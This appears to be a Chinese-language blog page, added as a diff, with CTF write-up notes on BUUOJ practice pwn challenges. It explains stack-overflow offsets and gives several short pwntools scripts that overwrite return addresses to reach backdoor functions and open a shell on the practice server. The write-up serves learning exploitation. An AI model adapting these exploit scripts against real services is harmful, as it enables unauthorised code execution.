@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>pwn buu notes - 少莽</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="zhishaomang,"> 
+    <meta name="description" content="一、rip进入ida，F12，找后门函数的位置:0X401186然后就是找栈溢出：ps：32位程序中ebp为4个字节，64位中ebp为8个字节发现有危险函数gets：溢出的字符长度是F+8 = 23,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="少莽" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="pwn buu notes - 少莽"/>
+    <meta name="twitter:description" content="一、rip进入ida，F12，找后门函数的位置:0X401186然后就是找栈溢出：ps：32位程序中ebp为4个字节，64位中ebp为8个字节发现有危险函数gets：溢出的字符长度是F+8 = 23,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="少莽"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="pwn buu notes - 少莽"/>
+    <meta property="og:description" content="一、rip进入ida，F12，找后门函数的位置:0X401186然后就是找栈溢出：ps：32位程序中ebp为4个字节，64位中ebp为8个字节发现有危险函数gets：溢出的字符长度是F+8 = 23,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">少莽</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">pwn buu notes</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">pwn buu notes</h1>
+        <div class="stuff">
+            <span>六月 04, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="一、rip"><a href="#一、rip" class="headerlink" title="一、rip"></a>一、rip</h2><p>进入ida，F12，找后门函数的位置:0X401186<br><img src="https://img-blog.csdnimg.cn/f140c48de67e40a7868027d570798314.png" alt="在这里插入图片描述"><br>然后就是找栈溢出：<br>ps：32位程序中ebp为4个字节，64位中ebp为8个字节<br>发现有危险函数gets：<br>溢出的字符长度是F+8 = 23</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);<span class="comment">//Gets函数不限制输入的字符数量，可以无限的输入</span></span><br><span class="line">  <span class="built_in">gets</span>(&amp;s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/7a54463e9f3041f98959fb6cb884ce3f.png" alt="在这里插入图片描述"><br>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26593</span>)</span><br><span class="line">sys_addr= <span class="number">0x40118A</span>//后门函数命令</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span>+<span class="number">8</span>) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26593</span>)</span><br><span class="line">sys_addr= <span class="number">0x401186</span>//后门函数所在的函数的地址</span><br><span class="line">rt_addr= <span class="number">0x401185</span>//<span class="keyword">return</span>地址</span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xF</span>+<span class="number">8</span>) + p64(rt_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、warmup-csaw-2016"><a href="#二、warmup-csaw-2016" class="headerlink" title="二、warmup_csaw_2016"></a>二、warmup_csaw_2016</h2><p><img src="https://img-blog.csdnimg.cn/d87d51d9d18a4ef5a691540caf3fa663.png" alt="在这里插入图片描述"><br>老样子，找后门函数，找了个cat命令<br><img src="https://img-blog.csdnimg.cn/644f844dbc0d4753a79c74666062793d.png" alt="在这里插入图片描述"><br>然后看溢出点：<br>是40+8<br><img src="https://img-blog.csdnimg.cn/45d0b58686db4564b99099d1f1e4e9a9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e19d2a94bc994161a3078dbe126a9354.png" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29407</span>)</span><br><span class="line">sys_addr= <span class="number">0x400611</span><span class="comment">#也可以换成这个命令所在的函数地址40060D</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、ciscn-2019-n-1"><a href="#三、ciscn-2019-n-1" class="headerlink" title="三、ciscn_2019_n_1"></a>三、ciscn_2019_n_1</h2><p><img src="https://img-blog.csdnimg.cn/9d76d4cb771a423e8bcb902e5e96c996.png" alt="在这里插入图片描述"><br>先找关键代码，再看溢出：<br><img src="https://img-blog.csdnimg.cn/18434112562f4ee1a73bc5a7be07a8d4.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9e0c0a48e6e143bf9988da9f67da7874.png" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27561</span>)</span><br><span class="line">sys_addr= <span class="number">0x4006BE</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27561</span>)</span><br><span class="line">sys_addr= <span class="number">0x4006BE</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>) + p32(<span class="number">0x41348000</span>)<span class="comment">#也可以直接利用if条件，覆盖v2的值，把正确的v2覆盖上去</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、pwn1-sctf-2016"><a href="#四、pwn1-sctf-2016" class="headerlink" title="四、pwn1_sctf_2016"></a>四、pwn1_sctf_2016</h2><p><img src="https://img-blog.csdnimg.cn/a5c9a7aa7cea46839d5f8bbc3d5b0163.png" alt="在这里插入图片描述"><br>这次是32位的了，但是有个NX保护</p>
+<blockquote>
+<p>NX保护就是CPU不会执行放在内存段中的代码，也就是我们之前在BOF中学习的像内存中写入Shell的方法，在开启NX后是不可行的</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/a1714adebf4a4715a2c556a57b54bccd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e460065ff8314dc4a27913caf67d3403.png" alt="在这里插入图片描述"><br>核心代码的意思是：将l转为you三个字节<br>fgets函数限制我们输入32的字节，但是溢出需要3C（60）字节，所以输入20个l即可，然后又是32位程序，再覆盖4个字节旧ebp，所以是21+1.</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://dl.stream.qqmusic.qq.com/C400001OUQ6M2WeMRO.m4a?guid=8163272410&vkey=C6BFF6D45012D604172E87D65FF2374E512C935275765A15128BE77C8FB1CA7110313E815EB620C046DDFA4D4580F98DAE74B533BA12DACE&uin=1552804588&fromtag=120002"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81rip"><span class="toc-number">1.</span> <span class="toc-text">一、rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81warmup-csaw-2016"><span class="toc-number">2.</span> <span class="toc-text">二、warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81ciscn-2019-n-1"><span class="toc-number">3.</span> <span class="toc-text">三、ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">四、pwn1_sctf_2016</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"left","hOffset":5,"vOffset":-84},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+<!-- Google Analytics -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=zhishaomang"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'zhishaomang');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
